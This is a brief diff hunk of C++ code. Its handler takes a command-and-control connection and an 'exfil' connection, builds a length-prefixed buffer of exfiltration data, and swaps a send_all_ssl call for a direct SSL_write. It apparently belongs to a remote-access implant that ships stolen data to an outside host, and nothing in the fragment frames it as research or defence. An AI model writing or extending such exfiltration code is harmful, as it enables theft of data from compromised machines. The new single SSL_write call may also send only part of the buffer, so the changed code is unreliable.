@@ -172,7 +172,9 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
         buffer.insert(buffer.end(), size_bytes, size_bytes + 4);
         buffer.insert(buffer.end(), exfil_data.begin(), exfil_data.end());
 
-        send_all_ssl(exfil_ssl, buffer.data(), buffer.size());
+        //send_all_ssl(exfil_ssl, buffer.data(), buffer.size());
+
+        SSL_write(exfil_ssl, buffer.data(), buffer.size());
     }
 }
 
